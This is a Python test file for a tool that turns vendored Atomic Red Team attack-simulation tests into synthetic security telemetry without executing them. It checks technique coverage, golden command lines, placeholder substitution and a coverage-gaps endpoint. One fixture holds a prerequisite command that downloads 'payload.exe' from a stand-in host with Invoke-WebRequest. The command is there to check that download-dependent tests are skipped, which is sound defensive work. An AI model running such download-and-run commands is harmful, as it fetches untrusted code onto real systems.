import json
from pathlib import Path

from fastapi.testclient import TestClient

from app.main import app
from app.telemetry.generators.atomic_red_team_loader import (
    AtomicTest,
    _first_usable_test,
    _resolve_command,
    load_atomic_tests,
)
from app.telemetry.generators.atomic_telemetry_builder import build_atomic_telemetry
from app.telemetry.generators.synthetic_log_generator import (
    available_simulation_techniques,
    run_simulation,
)


GOLDEN_COMMANDS = json.loads(
    (Path(__file__).parent / "fixtures" / "atomic_command_lines.json").read_text(encoding="utf-8")
)


def test_vendored_atomic_loader_supports_at_least_200_distinct_techniques():
    atomic_tests = load_atomic_tests()
    assert len(atomic_tests) >= 200
    assert len(available_simulation_techniques()) >= 200

    # Build every advertised Atomic simulation. This does not execute a command.
    for technique_id in atomic_tests:
        events = run_simulation(technique_id, "atomic-scale-test")
        assert len(events) >= 1
        assert all(ev.technique_id == technique_id for ev in events)


def test_atomic_command_lines_match_reviewed_golden_file():
    atomic_tests = load_atomic_tests()
    executor_images = {
        "command_prompt": "C:\\Windows\\System32\\cmd.exe",
        "powershell": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "sh": "/bin/sh",
        "bash": "/bin/bash",
    }
    assert len(GOLDEN_COMMANDS) == 10
    for technique_id, expected_command in GOLDEN_COMMANDS.items():
        atomic_test = atomic_tests[technique_id]
        event = build_atomic_telemetry(atomic_test, "atomic-golden-test")
        assert event.CommandLine == expected_command
        assert "#{" not in event.CommandLine
        assert event.Image == executor_images[atomic_test.executor_name]


def test_default_arguments_are_substituted_using_atomic_placeholder_syntax():
    test = {
        "name": "placeholder test",
        "auto_generated_guid": "00000000-0000-0000-0000-000000000001",
        "supported_platforms": ["windows"],
        "input_arguments": {"target": {"type": "Path", "default": "C:\\Temp\\target.txt"}},
        "executor": {"name": "command_prompt", "command": "type #{target}"},
    }
    assert _resolve_command(test) == "type C:\\Temp\\target.txt"
    assert _first_usable_test("T0000", {"atomic_tests": [test]}) == AtomicTest(
        "T0000",
        "placeholder test",
        "00000000-0000-0000-0000-000000000001",
        "command_prompt",
        "type C:\\Temp\\target.txt",
        ("windows",),
    )


def test_external_payload_dependencies_are_skipped():
    download_dependent_test = {
        "name": "download prerequisite",
        "auto_generated_guid": "00000000-0000-0000-0000-000000000002",
        "executor": {"name": "command_prompt", "command": "payload.exe"},
        "dependency_executor_name": "powershell",
        "dependencies": [
            {
                "prereq_command": "Test-Path payload.exe",
                "get_prereq_command": "Invoke-WebRequest https://example.invalid/payload.exe",
            }
        ],
    }
    assert _first_usable_test("T0001", {"atomic_tests": [download_dependent_test]}) is None


def test_coverage_gaps_endpoint_reports_unrunnable_vendored_techniques():
    gaps = TestClient(app).get("/simulator/coverage-gaps")
    assert gaps.status_code == 200
    assert gaps.json() == sorted(gaps.json())
    assert "T1010" in gaps.json()
